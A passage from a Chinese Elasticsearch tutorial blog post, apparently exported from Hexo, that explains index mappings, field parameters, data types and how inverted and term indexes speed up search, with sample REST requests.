**主动创建（显示映射）**\n\n\n动态映射只能保证最基础的数据结构的映射，所以很多时候我们需要对字段除了数据结构定义更多的限制的时候，动态映射创建的内容很可能不符合我们的需求，所以可以使用 PUT {index}/mapping 来更新指定索引的映射内容。\n\n7.2 动态映射Dynamic Mapping\n-----------------------\n\n写入文档的时候，索引不存在，会自动创建索引， 无需手动创建，ES会根据内容推断字段的类型，推断会不准确，可能造成某些功能无法使用，例如 范围查询。\n\n```\n\n\nPOST /log2/\\_doc/1  \n{  \n    \"uid\" : 1,  \n    \"ip\" : \"192.1.1.1\",  \n    \"transTime\" : \"2018-01-01\",  \n    \"content\" : \"中华人民共和国人民大会堂\"  \n}  \n\n\n\n```\n```\n\n\n查看一个索引当前的mapping  \n\n\n\n```\n```\n\n\nGET /log2/\\_mapping  \n\n\n\n```\n\n结果如下\n\n```\n\n\n{  \n    \"log2\": {  \n        \"mappings\": {  \n            \"properties\": {  \n                \"content\": {  \n                    \"type\": \"text\",  \n                    \"fields\": {  \n                        \"keyword\": {  \n                            \"type\": \"keyword\",  \n                            \"ignore\\_above\": 256  \n                        }  \n                    }  \n                },  \n                \"ip\": {  \n                    \"type\": \"text\",  \n                    \"fields\": {  \n                        \"keyword\": {  \n                            \"type\": \"keyword\",  \n                            \"ignore\\_above\": 256  \n                        }  \n                    }  \n                },  \n                \"transTime\": {  \n                    \"type\": \"date\"  \n                },  \n                \"uid\": {  \n                    \"type\": \"long\"  \n                }  \n            }  \n        }  \n    }  \n}  \n\n\n\n```\n```\n\n\n动态映射规则\n\n\n```\n\n| **JSON中数据类型** | **Elasticsearch 数据类型** |\n| --- | --- |\n|null| 不添加任何字段|\n| true或者false| boolean类型|\n| 浮点数据| float类型|\n| integer数据| long类型|\n| object| object类型|\n| array| 取决于数组中的第一个非空值的类型。|\n| string| 匹配日期格式，设置为date；匹配数字，设置为float或者long，功能默认关闭；设置为text，并增加keyword子字段。|\n\n7.3 显示的设置mapping\n----------------\n\n显示的设置mapping可以更灵活控制ES。 映射创建时，除了对字段的定义，Mapping创建的时候提供了一些对于查询策略和自身定义的参数配置。 下面只是简单介绍下映射支持的字段参数内容。\n\n| 参数 | 说明 |\n| --- | --- |\n|analyzer| 定义此字段索引时使用的分词方式|\n| normalizer| normalizer功能类似于analyzer，但是其可以使查询条件输出唯一的查询条件（可以认为其只是实现了条件小写等不会产生多个查询条件的相关操作）|\n| boost| 定义当前字段的查询权重|\n| coerce| 此字段控制是否尝试修复部分错误的数据格式，（比如对一个整数字段插入字符串比如\"5\"，此时此字符串可以被解析为数字），默认为true|\n| copy\\_to| 类似于别名，不同之处参数可以将此字段内容复制到指定字段中，多个字段可以复制到同一个字段中|\n| doc\\_values| 倒排索引虽然可以快速查询文档中内容，但是在进行排序或聚合操作的时候，倒排索引并不能获得文档内容，所以需要存储一份文档数据到doc\\_values，而此参数控制字段是否需要存储在doc\\_values中的开关。|\n| dynamic| 是否开启动态映射，目前支持三个参数：true/false 开启和关闭，strict 当出现未定义的字段，抛出异常并拒绝添加文档|\n| enabled| 此参数控制字段是否可以被索引，当被设置为false的时候表示此字段仅用来存储而无需索引，此时ES不会分析此字段内的数据，所以即使插入的非法的数据内容ES依旧允许执行|\n| fielddata| 类似doc\\_values都是单独存储额外的文档数据，这样通过倒排索引获取文档内容，从而实现在排序和聚合上的功能。不同的是doc\\_values不支持text格式，text格式数据需要使用fielddata。此参数默认是禁止的，这是因为在第一次对字段进行排序或聚合的时候它会把这个列数据都加载到内存中，这样会带来大量的内存消耗。|\n| eager\\_global\\_ordinals| 是否使用全局序号来进行聚合。主要在聚合分析构建hash的时候，使用序号来替代doc的值，这样在文档收集阶段根据需要收集到各个桶中，在计算结果时将序号转换为具体doc内容。但是此操作在每次查询时需要重建doc序号关系|\n| format| 日期类型字段用来解析的日期格式|\n| ignore\\_above| 当插入字段长度超过此字段设置的值后，此内容将不被索引或存储。对于数组结构字段会作用到每一个元素|\n| ignore\\_malformed| 当向一个字段插入错误的数据类似时，会抛出异常并拒绝文档。但设置此参数后，对字段插入错误的数据时会忽略异常，此文档错误的数据将不被索引，但是其他字段则正常。|\n| index\\_options| 控制将哪些信息添加到反向索引中|\n| index\\_phrases| 主要将两个单词的组合索引到单独字段中，这样在进行精确的短语查询的时候会更有效。支持true和false参数。默认为false。此参数会使索引变大|\n| index\\_prefixes| 允许对字段的前缀进行索引，此参数用来提高查询的速度|\n| index| 控制字段是否可以被索引，被设置为false的字段无法被索引到|\n| fields| 此参数可以为同一个字段设置不同的索引方式，但是在\\_source字段中只会保存一份，并不会实际增加存储。但是会增加索引大小|\n| norms| norms里面存储的是各种各样的归一化因子，此内容会影响到文档的得分，在不需要对字段进行打分的时候可以禁用此参数，需要注意的是对于keyword字段默认为false|\n| null\\_value| 一般来说空值是无法被索引的，但是此参数允许使用指定的值替换空值，以对其进行索引|\n| position\\_increment\\_gap| 增加近似值匹配|\n| properties| 定义类型映射、对象字段和嵌套字段等数据|\n| search\\_analyzer| 定义此字段查询时使用的分词方式|\n| similarity| 此参数可以配置用来计算字段相似性的算法|\n| store| 默认情况下字段内容会被索引但是并不会存储字段中的值，想获取字段中的值则需要在source中获取对应字段的数据，当查询仅仅是尝试获取指定字段的内容的时候，可以设置此参数为true，那么系统可以直接获取此字段的内容，不再尝试获取source中的数据。|\n| term\\_vector| 术语向量的定义，存储一些术语向量，以便可以为特定文档检索它们|\n| index| 控制字段是否可以被索引，被设置为false的字段无法被索引到|\n| fields| 此参数可以为同一个字段设置不同的索引方式，但是在\\_source字段中只会保存一份，并不会实际增加存储。但是会增加索引大小|\n| norms| norms里面存储的是各种各样的归一化因子，此内容会影响到文档的得分，在不需要对字段进行打分的时候可以禁用此参数，需要注意的是对于keyword字段默认为false|\n| null\\_value| 一般来说空值是无法被索引的，但是此参数允许使用指定的值替换空值，以对其进行索引|\n| position\\_increment\\_gap| 增加近似值匹配|\n| properties| 定义类型映射、对象字段和嵌套字段等数据|\n| search\\_analyzer| 定义此字段查询时使用的分词方式|\n| similarity| 此参数可以配置用来计算字段相似性的算法|\n| store| 默认情况下字段内容会被索引但是并不会存储字段中的值，想获取字段中的值则需要在source中获取对应字段的数据，当查询仅仅是尝试获取指定字段的内容的时候，可以设置此参数为true，那么系统可以直接获取此字段的内容，不再尝试获取source中的数据。|\n\n1.  **index** 表示字段是否索引。\n\n2.  **index\\_options**\n\n\nindex\\_options 控制倒排索引记录的内容，一共有4种配置可选。\n\n| index\\_options | 含义 |\n| --- | --- |\n|docs| 只记录文档id（ doc id ）|\n| freqs| 记录 doc id 和 term frequences|\n| positions| doc id 、 term frequences 、 term position|\n| offsets| doc id 、 term frequences 、 term position 、 character|\n| offsets|    |\n\n文本类型 text 默认的配置是 positions ，其他默认是docs。 需要注意的是，虽然index\\_options提供了offsets这种内容较多的配置级别，但是记录的内容越多，占用的空间也会越多，在实际操作中还是要根据实际情况进行配置。 例如创建mapping,字段名为user\\_name，字符串类型。user\\_name不需要索引,info字段的倒排索引类型为positions。\n\n```\n\n\nPUT mapping\\_test3  \n{  \n    \"mappings\": {  \n        \"properties\": {  \n            \"user\\_name\": {  \n                \"index\": false,  \n                \"type\": \"text\"  \n            },  \n            \"info\": {  \n                \"index\\_options\": \"positions\",  \n                \"type\": \"text\"  \n            },  \n            \"doc\": {  \n                \"type\": \"text\",  \n                \"index\\_options\": \"docs\"  \n            },  \n            \"freq\": {  \n                \"type\": \"text\",  \n                \"index\\_options\": \"freqs\"  \n            },  \n            \"offset\": {  \n                \"type\": \"text\",  \n                \"index\\_options\": \"offsets\"  \n            }  \n        }  \n    }  \n}  \n\n\n\n```\n\n3.  **ANALYZER** 分词器。es有内置的分词器，也可以使用第三方的分词工具。如IK。\n\n\n```\n\n\n{  \n    \"mappings\": {  \n        \"my\\_type\": {  \n            \"properties\": {  \n                \"content\": {  \n                    \"type\": \"text\",  \n                    \"analyzer\": \"ik\\_max\\_word\",//写入是的分词器  \n                    \"search\\_analyzer\": \"ik\\_max\\_word\"//搜索时的分词器  \n                }  \n            }  \n        }  \n    }  \n}  \n\n\n\n```\n\n4.  **COPY\\_TO**\n\n\n允许将一个或者多个字段的值复制到某一个字段中。用来满足一些搜索需要，类似于数据库 title like \"%a%\" or title2 like \"%a%\" copy\\_to的字段不会出现在\\_source里面\n\n```\n\n\n{  \n    \"mappings\": {  \n        \"my\\_type\": {  \n            \"properties\": {  \n                \"first\\_name\": {  \n                    \"type\": \"text\",  \n                    \"copy\\_to\": \"full\\_name\"  \n                },  \n                \"last\\_name\": {  \n                    \"type\": \"text\",  \n                    \"copy\\_to\": \"full\\_name\"  \n                },  \n                \"full\\_name\": {  \n                    \"type\": \"text\"  \n                }  \n            }  \n        }  \n    }  \n}  \n  \nPUT my\\_index/my\\_type/1  \n{  \n    \"first\\_name\": \"John\",  \n    \"last\\_name\": \"Smith\"  \n}   \n//full\\_name = \\[\"John\",\"Smith\"\\]  \n\n\n\n```\n\n5.  **DOC\\_VALUES**\n\n\n为了加快排序、聚合操作，在建立倒排索引的时候，额外增加一个列式存储映射，是一个空间换时间的做法。 默认是开启的，对于确定不需要聚合或者排序的字段可以关闭。 注意：text类型没有doc\\_values。\n\n```\n\n\n{  \n    \"mappings\": {  \n        \"my\\_type\": {  \n            \"properties\": {  \n                \"status\\_code\": {  \n                    \"type\": \"keyword\"  \n                },  \n                \"session\\_id\": {  \n                    \"type\": \"keyword\",  \n                    \"doc\\_values\": false  \n                }  \n            }  \n        }  \n    }  \n}  \n\n\n\n```\n\n6.  **ENABLED**\n\n\nenabled默认为true,将搜索所有字段。如果设置为false，该字段将不会被搜索。但仍会随着\\_source返回\n\n7.  **FIELDDATA**\n\n\n对非text类型的字段进行排序可以使用doc\\_value来进行加速。但是对于，text类型的字段，却不能进行分组排序。更何况加速。 下面这个异常展示了，对text类型的字段进行分组排序的错误。\n![](./2024/06/16/ES从入门到精通/27.png)\n但是可以通过设置fielddata值来达到这一目的。它将字段加载到内存中，因此第一次肯定会很慢。而且将占用内存。\n\n8.  **FORMAT**\n\n\n对字段进行格式化。\n\n```\n\n\n{  \n    \"mappings\": {  \n        \"my\\_type\": {  \n            \"properties\": {  \n                \"date\": {  \n                    \"type\": \"date\",  \n                    \"format\": \"yyyy-MM-dd\"  \n                }  \n            }  \n        }  \n    }  \n}  \n\n\n\n```\n\n9.  **IGNORE\\_ABOVE**\n\n\n大小超过ignore\\_above设置的字符串不会被索引或存储。\n\n10.  FIELDS\n\n\n可以为一个字段映射多个数据类型。比如，一个字符串，可以映射为text，满足全文搜索。同时可以映射为keyword,满足分组和排序。 也可以使用多个分词器来对同一个字段进行分词。\n\n```\n\n\n{  \n    \"mappings\": {  \n        \"my\\_type\": {  \n            \"properties\": {  \n                \"city\": {  \n                    \"type\": \"text\",  \n                    \"fields\": {  \n                        \"raw\": {  \n                            \"type\": \"keyword\"  \n                        }  \n                    }  \n                }  \n            }  \n        }  \n    }  \n}  \n\n\n\n```\n\n11.  **STORE**\n\n\n我们知道，source字段存储了原始数据(默认)。当然可以通过设置其属性值来选择不存储。此外，还可以通过store选择是否额外存储某个字段。store属性默认为no,表示不存储。当设置为yes时，会在source之 外独立存储。此时，搜索时，会绕过\\_source，单独进行一次IO得到该字段的值。 store会严重影响搜索效率，尽管如此，在以下两种情况下，还是可以选择使用：\n\n*   字段很长，每次检索\\_source代价很大。\n\n*   需要单独对某些字段进行索引重建。\n\n\n7.4 ES中常见数据类型\n-------------\n\n1.  **字符串**\n\n\n字符串在之前的版本主要指的是 string 类型。但是在5.X版本已经不支持 string 类型。其被 text 和keyword 类型替代\n\n2.  **text**\n\n\ntext字段需要被全文搜索的内容，它可以保存非常长的内容。查询的时候一般使用分词器器进⾏行行分词然后进行全文搜索。text类型的字段不用于排序，很少用于聚合。 （text类型的数据被用来索引长文本，例如电子邮件主体部分或者一款产品的介绍，这些文本会被分析，在建立索引文档之前会被分词器进行分词，转化为词组。经过分词机制之后es允许检索到该文本切分而成的词语，但是text类型的数据不能用来过滤、排序和聚合等操作。\n\n3.  **keyword**\n\n\n此字段不能使用分词器进行查询，只能搜索该字段的完整的值。所以其主要保存一些可以索引的结构化内容。此字段可以进行排序、聚合等操作。 keyword类型的数据可以满足电子邮箱地址、主机名、状态码、邮政编码和标签等数据的要求，不进行分词，常常被用来过滤、排序和聚合。 综上，可以发现text类型在存储数据的时候会默认进行分词，并生成索引。而keyword存储数据的时候，不会分词建立索引，显然，这样划分数据更加节省内存。）\n\n8 底层知识：正排索引和倒排索引底层原理\n====================\n\n8.1 什么是正排索引\n-----------\n\n正排索引是按照文档编号或文档ID等有序的方式将每个文档存储在索引中，通过文档编号或ID进行检索。\n\n这种方式类似于数据库表的行，可以很方便地根据文档ID检索到具体的文档，但是不适合处理大规模文档库的情况。\n\n比如mysql的b+锁索引结构\n![](./2024/06/16/ES从入门到精通/28.png)\n比如书籍目录，可以根据页码找文档内容，就是正排索引\n![](./2024/06/16/ES从入门到精通/29.png)\n8.2 什么是倒排索引\n-----------\n\n倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。 倒排索引可以理解为Map< item, list< id>>，能够由查询词快速（时间复杂度O(1)）找到包含这个查询词的文件的数据结构。\n![](./2024/06/16/ES从入门到精通/30.png)\n比如书籍索引页根据关键词，找页码就是倒排索引\n![](./2024/06/16/ES从入门到精通/31.png)\n8.3 ES如何做到快速索引\n--------------\n\n假设有这么几条数据\n\n```\n\n\n| ID | Name | Age | Sex |  \n| -- |:------------:| -----:| -----:|  \n| 1 | Kate | 24 | Female  \n| 2 | John | 24 | Male  \n| 3 | Bill | 29 | Male  \n\n\n\n```\n\nID是Elasticsearch自建的文档id，那么Elasticsearch建立的索引如下: Name：\n\n```\n\n\n| Term | Posting List |  \n| -- |:----:|  \n| Kate | 1 |  \n| John | 2 |  \n| Bill | 3 |  \n\n\n\n```\n\nAge：\n\n```\n\n\n| Term | Posting List |  \n| -- |:----:|  \n| 24 | \\[1,2\\] |  \n| 29 | 3 |  \n\n\n\n```\n\n### 8.3.1 Posting List\n\nElasticsearch分别为每个field都建立了一个倒排索引，\n\n*   Kate, John, 24, Female这些叫term，\n\n*   而\\[1,2\\]就是Posting List。\n\n\nPosting list就是一个int的数组，存储了所有符合某个term的文档id。 根据id查找的话，通过posting list这种索引方式似乎可以很快进行查找，比如要找age=24的同学，在id数组中查找即可。二分查找，但是，如果想通过name来查找呢？\n\n### 8.3.2 Term Dictionary\n\nElasticsearch为了能快速找到某个term，将所有的term排个序，二分法查找term，logN的查找效， 就像通过字典查找一样. 这样我们可以用二分查找的方式，比全遍历更快地找出目标的term。 这个就是 term dictionary。 所以：反向索引分成两部分，如下图(来自《信息检索导论》)：\n![](./2024/06/16/ES从入门到精通/32.png)\n左面是词项词典(Term Dictionary)，右边是倒排记录表(Posting)。 在Lucene中，词典和倒排是分开存储的，词典存储在.tii和.tis文件中。 而倒排又分为两部分存储，第一部分是文档号和词频信息，存储在.frq中；另一部分是词的位置信息， 存储在.prx文件中。 有了term dictionary之后，可以用 logN 次磁盘查找得到目标。 问题是：现在再看起来，似乎和传统数据库通过B+Tree的方式类似啊，为什么说比B+Tree的查询快？\n\n### 8.3.3 Term Index\n\nB-Tree通过**减少磁盘寻道次数**来提高查询性能，Elasticsearch也是采用同样的思路\n\n但是磁盘的随机读操作仍然是非常昂贵的（一次random access大概需要10ms的时间）。\n\n所以尽量少的读磁盘，有必要把一些数据缓存到内存里。**Elasticsearch直接通过内存查找term，不读磁盘**\n\n但是整个term dictionary本身又太大了，无法完整地放到内存里。\n\n于是就有了term index。term index有点像一本字典的大的章节表，或者说，像一本书的目录。\n\n比如：\n\n```\n\n\nA开头的term ……………. Xxx页  \nC开头的term ……………. Xxx页  \nE开头的term ……………. Xxx页  \n\n\n\n```\n\n如果所有的term都是英文字符的话，可能这个term index就真的是26个英文字符表构成的了。 但是实际的情况是，term未必都是英文字符，term可以是任意的byte数组。\n\n而且26个英文字符也未必是每一个字符都有均等的term，比如x字符开头的term可能一个都没有，而s开头的term又特别多。\n\n实际的term index，的内部结构，类似一棵 trie 树：\n![](./2024/06/16/ES从入门到精通/33.png)\n例子是一个包含 “A”, “to”, “tea”, “ted”, “ten”, “i”, “in”, 和 “inn” 的 trie 树。 Term Dictionary与Term Index存储，Term Dictionary文件的后缀名为tim，Term Index文件的后缀名是tip。\n\n> Lucene为词典做了一层前缀索引(Term Index)，这个索引在Lucene4.0以后采用的数据结构是FST (Finite State Transducer)，一种前缀树的变种，可以称之为前缀索引。\n\n这种数据结构占用空间很小，Lucene打开索引的时候将其全量装载到内存中，加快磁盘上词典查询速度的同时减少随机磁盘访问次数。\n\n### 8.3.4 Trie树（前缀树，字典树）\n\nTrie，又经常叫前缀树，字典树等等。\n\n*   一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。\n\n*   一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。\n\n\ntrie中的键通常是字符串，但也可以是其它的结构。它有很多变种，如后缀树，Radix Tree/Trie，PATRICIA tree，以及bitwise版本的crit-bit tree。\n\n当然很多名字的意义其实有交叉。 在计算机科学中，trie，又称前缀树或字典树，是一种有序树，用于保存关联数组，其中的键通常是字 符串。\n\n与二叉查找树不同，键不是直接保存在节点中，而是由节点在树中的位置决定。\n\ntrie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。\n\n这棵树不会包含所有的 term，它包含的是 term 的一些前缀。\n\n通过 term index 可以快速地定位到 term dictionary 的某个 offset，然后从这个位置再往后顺序查找。\n\n再加上一些压缩技术（搜索 Lucene Finite State Transducers）, term index 的尺寸可以只有所有term 的尺寸的**几十分之一**，使得用内存缓存整个 term index 变成可能。整体上来说就是这样的效果：\n![](./2024/06/16/ES从入门到精通/34.png)\n### 8.3.5 为什么ES检索比Mysql快\n\n现在我们可以回答**“为什么 Elasticsearch/Lucene 检索可以比 Mysql 快”** 了。 Mysql 只有 term dictionary 这一层，是以 b+tree 排序的方式存储在磁盘上的。\n\n检索一个 term 需要若干次（1-3次）的 random access 的磁盘操作。\n\n而ES/ Lucene 在 term dictionary 的基础上添加了 term index 来加速检索，term index 以类似前缀树的形式缓存在内存中。 从 term index 查到对应的 term dictionary 的 block 位置之后，再去磁盘上找 term，大大减少了磁盘的 random access 次数, 将3次 变成了1次。\n\n\n","slug":"ES从入门到精通","published":1,"updated":"2024-06-16T11:29:57.661Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ry3000kbsuh53bxfa3e","content":"<h1 id=\"ElasticSearch-从入门到工业级使用\"><a href=\"#ElasticSearch-从入门到工业级使用\" class=\"headerlink\" title=\"ElasticSearch 从入门到工业级使用\"></a>ElasticSearch 从入门到工业级使用</h1><h2 id=\"1-1-什么是全文检索\"><a href=\"#1-1-什么是全文检索\" class=\"headerlink\" title=\"1.1 什么是全文检索\"></a>1.1 什么是全文检索</h2><p>将非结构化数据中的一部分信息提取出来，重新组织，使其变得有一定结构，然后对此有一定结构的数据进行搜索，从而达到搜索相对较快的目的。这部分从非结构化数据中提取出的然后重新组织的信息，我们称之索引。</p>\n<p>例如：字典。字典的拼音表和部首检字表就相当于字典的索引，对每一个字的解释是非结构化的，如果字典没有音节表和部首检字表，在茫茫辞海中找一个字只能顺序扫描。</p>\n<p>然而字的某些信息可以提取出来进行结构化处理，比如读音，就比较结构化，分声母和韵母，分别只有几种可以一一列举，于是将读音拿出来按一定的顺序排列，每一项读音都指向此字的详细解释的页数。</p>\n<p>我们搜索时按结构化的拼音搜到读音，然后按其指向的页数，便可找到我们的非结构化数据——也即对字的解释。 这种先建立索引，再对索引进行搜索的过程就叫全文检索(Full-text Search)。</p>\n<p>虽然创建索引的过程也是非常耗时的，但是索引一旦创建就可以多次使用，全文检索主要处理的是查询，所以耗时间创建索引是值得的。<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/1.png\"><br>比如使用全文检索，所搜索“生化机”<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/2.png\"><br>（有可能是手抖打错了，本来是生化危机），但是期望需要出来右侧的 4条 记录</p>\n<p>有 4条 数据将每条数据进行词条拆分。</p>\n<p>如“生化危机电影”拆成：生化、危机、电影 关键词（拆分结果与策略算法有关）每个关键词将对应包含此关键词的数据 ID搜索的时候，直接匹配这些关键词，就能拿到包含关键词的数据这个过程就叫做全文检索。</p>\n<p>而词条拆分和词条对应的 ID 这个就是倒排索引的的基本原理</p>\n<p><strong>对比数据库的缺陷</strong></p>\n<p>mysql如果没有索引的情况下，共有100万条,按照之前的思路,其实就要扫描100万次，而且每次扫描,都需要匹配那个文本所有的字符，确认是否包含搜索的关键词，而且还不能将搜索词拆解开来进行检索<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/3.png\"><br><strong>全文检索使用场景</strong></p>\n<ul>\n<li><p>维基百科，类似百度百科，牙膏，牙膏的维基百科，全文检索，高亮，搜索推荐</p>\n</li>\n<li><p>The Guardian（国外新闻网站），类似搜狐新闻，用户行为日志（点击，浏览，收藏，评论）+社交网络数据（对某某新闻的相关看法），数据分析，给到每篇新闻文章的作者，让他知道他的文章的公众反馈（好，坏，热门，垃圾，鄙视，崇拜）</p>\n</li>\n<li><p>Stack Overflow（国外的程序异常讨论论坛），IT问题，程序的报错，提交上去，有人会跟你讨论和回答，全文检索，搜索相关问题和答案，程序报错了，就会将报错信息粘贴到里面去，搜索有没有对应的答案</p>\n</li>\n<li><p>GitHub（开源代码管理），搜索上千亿行代码（5）电商网站，检索商品</p>\n</li>\n<li><p>日志数据分析，logstash采集日志，ES进行复杂的数据分析（ELK技术，elasticsearch+logstash+kibana）</p>\n</li>\n<li><p>商品价格监控网站，用户设定某商品的价格阈值，当低于该阈值的时候，发送通知消息给用户，比如说订阅牙膏的监控，如果高露洁牙膏的家庭套装低于50块钱，就通知我，我就去买</p>\n</li>\n<li><p>BI系统，商业智能，Business Intelligence。比如说有个大型商场集团，BI，分析一下某某区域最近3年的用户消费金额的趋势以及用户群体的组成构成，产出相关的数张报表，**区，最近3年，每年消费金额呈现100%的增长，而且用户群体85%是高级白领，开一个新商场。ES执行数据分析和挖掘，Kibana进行数据可视化</p>\n</li>\n</ul>\n<h2 id=\"1-2-ES简介\"><a href=\"#1-2-ES简介\" class=\"headerlink\" title=\"1.2 ES简介\"></a>1.2 ES简介</h2><p>Elaticsearch，简称为es， es是一个开源的高扩展的分布式全文检索引擎，它可以近乎实时的存储、检索数据；本身扩展性很好，可以扩展到上百台服务器，处理PB级别的数据。</p>\n<p>es也使用Java开发并使用Lucene作为其核心来实现所有索引和搜索的功能，但是它的目的是通过简单的RESTful API来隐藏Lucene的复杂性，从而让全文搜索变得简单。</p>\n<p>Elasticsearch是面向文档(document oriented)的，这意味着它可以存储整个对象或文档(document)。然而它不仅仅是存储，还会索引(index)每个文档的内容使之可以被搜索。</p>\n<p>在Elasticsearch中，你可以对文档（而非成行成列的数据）进行索引、搜索、排序、过滤。Elasticsearch比传统关系型数据库如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Relational DB -&gt; Databases -&gt; Tables -&gt; Rows -&gt; Columns  </span><br><span class=\"line\">Elasticsearch -&gt; Indices   -&gt; Types  -&gt; Documents -&gt; Fields  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Elasticsearch提供多种语言支持，其中Java的客户端为 Java REST Client 。</p>\n<p>而它又分成两种：高级和低级的。高级包含更多的功能，如果把高级比作MyBatis的话，那么低级就相当于JDBC，是基于Netty和Server通讯相关。</p>\n<h2 id=\"高级的-Client类似Mybatis是对于Low-Level的封装。1-3-ES基本概念\"><a href=\"#高级的-Client类似Mybatis是对于Low-Level的封装。1-3-ES基本概念\" class=\"headerlink\" title=\"高级的 Client类似Mybatis是对于Low Level的封装。1.3 ES基本概念\"></a>高级的 Client类似Mybatis是对于Low Level的封装。<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/4.png\"><br>1.3 ES基本概念</h2><ol>\n<li><strong>索引库</strong></li>\n</ol>\n<p>ElasticSearch将它的数据存储在一个或多个索引（index）中。</p>\n<p>用SQL领域的术语来类比，索引就像数据库，可以向索引写入文档或者从索引中读取文档，并通过ElasticSearch内部使用Lucene将数据写入索引或从索引中检索数据。</p>\n<p>Elastic Search使用倒排索引（Inverted Index）来做快速的全文搜索，这点与数据库不同，一般数据库 的索引，用B+Tree来实现。</p>\n<table>\n<thead>\n<tr>\n<th><strong>Relational DB</strong></th>\n<th><strong>Databases</strong></th>\n<th><strong>Tables</strong></th>\n<th><strong>表结构</strong></th>\n<th><strong>Rows</strong></th>\n<th><strong>Columns</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ElasticSearch</td>\n<td>Indices</td>\n<td>Types</td>\n<td>映射mapping</td>\n<td>Documents</td>\n<td>Fields 字段</td>\n</tr>\n</tbody></table>\n<p>索引库就是存储索引的保存在磁盘上的一系列的文件。里面存储了建立好的索引信息以及文档对象。一个索引库相当于数据库中的一张表。<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/5.png\"><br>2.  <strong>document对象</strong></p>\n<p>获取原始内容的目的是为了索引，在索引前需要将原始内容创建成文档（Document），文档中包括一个一个的域（Field），域中存储内容。</p>\n<p>每个文档都有一个唯一的编号，就是文档id。</p>\n<p>document对象相当于表中的一条记录。</p>\n<p>文档（document）是ElasticSearch中的主要实体。</p>\n<p>对所有使用ElasticSearch的案例来说，他们最终都可以归结为对文档的搜索。</p>\n<p>文档由字段构成。</p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/6.png\"><br>3.  <strong>field对象</strong></p>\n<p>如果我们把document看做是数据库中一条记录的话，field相当于是记录中的字段。field是索引库中存储数据的最小单位。field的数据类型大致可以分为数值类型和文本类型，一般需要查询的字段都是文本类型的，field的还有如下属性：</p>\n<ul>\n<li><p>是否分词：是否对域的内容进行分词处理。前提是我们要对域的内容进行查询。</p>\n</li>\n<li><p>是否索引：将Field分析后的词或整个Field值进行索引，只有索引方可搜索到。比如：商品名称、商品简介分析后进行索引，订单号、身份证号不用分词但也要索引，这些将来都要作为查询条件。</p>\n</li>\n<li><p>是否存储：将Field值存储在文档中，存储在文档中的Field才可以从Document中获取。比如：商品名称、订单号，凡是将来要从Document中获取的Field都要存储。</p>\n</li>\n</ul>\n<ol start=\"4\">\n<li><strong>term对象</strong></li>\n</ol>\n<p>从文档对象中拆分出来的每个单词叫做一个Term，不同的域中拆分出来的相同的单词是不同的term。</p>\n<p>term中包含两部分一部分是文档的域名，另一部分是单词的内容。</p>\n<p>term是创建索引的关键词对象。</p>\n<ol start=\"8\">\n<li><strong>类型（type）</strong></li>\n</ol>\n<p>每个文档都有与之对应的类型（type）定义。</p>\n<p>这允许用户在一个索引中存储多种文档类型，并为不同文 档提供类型提供不同的映射。 type的版本迭代</p>\n<ul>\n<li><p>5.x及以前版本一个index有一个或者多个type</p>\n</li>\n<li><p>6.X版本一个index只有一个index</p>\n</li>\n<li><p>7.X版本移除了type，type相关的所有内容全部变成Deprecated，为了兼容升级和过渡，所有的7.X版本es数据写入后type字段都默认被置为_doc</p>\n</li>\n<li><p>8.X版本完全废弃type</p>\n</li>\n</ul>\n<ol start=\"9\">\n<li><strong>映射（mapping）</strong></li>\n</ol>\n<p>mapping是处理数据的方式和规则方面做一些限制，如某个字段的数据类型、默认值、分析器、是否被索引等等，这些都是映射里面可以设置的，其它就是处理es里面数据的一些使用规则设置也叫做映射，按着最优规则处理数据对性能提高很大，因此才需要建立映射，并且需要思考如何建立映射才能对性能更好。</p>\n<ol start=\"10\">\n<li><strong>分片（shards）</strong></li>\n</ol>\n<p>代表索引分片，es可以把一个完整的索引分成多个分片，这样的好处是可以把一个大的索引拆分成多个，分布到不同的节点上。构成分布式搜索。分片的数量只能在索引创建前指定，并且索引创建后不能更改。</p>\n<p>5.X默认不能通过配置文件定义分片 ES默认5:1 5个主分片，每个分片，1个副本分片</p>\n<ol start=\"11\">\n<li><strong>副本（replicas）</strong></li>\n</ol>\n<p>代表索引副本，es可以设置多个索引的副本，副本的作用：</p>\n<ul>\n<li><p>提高系统的容错性，当个某个节点某个分片损坏或丢失时可以从副本中恢复。</p>\n</li>\n<li><p>是提高es的查询效率，es会自动对搜索请求进行负载均衡。</p>\n</li>\n</ul>\n<ol start=\"12\">\n<li><strong>集群（cluster）</strong></li>\n</ol>\n<p>代表一个集群，集群中有多个节点（node），其中有一个为主节点，这个主节点是可以通过选举产生的，主从节点是对于集群内部来说的。es的一个概念就是去中心化，字面上理解就是无中心节点，这是对于集群外部来说的，因为从外部来看es集群，在逻辑上是个整体，你与任何一个节点的通信和与整个es集群通信是等价的。</p>\n<h1 id=\"2-安装和DSL的使用\"><a href=\"#2-安装和DSL的使用\" class=\"headerlink\" title=\"2 安装和DSL的使用\"></a>2 安装和DSL的使用</h1><h2 id=\"2-1-安装ES\"><a href=\"#2-1-安装ES\" class=\"headerlink\" title=\"2.1 安装ES\"></a>2.1 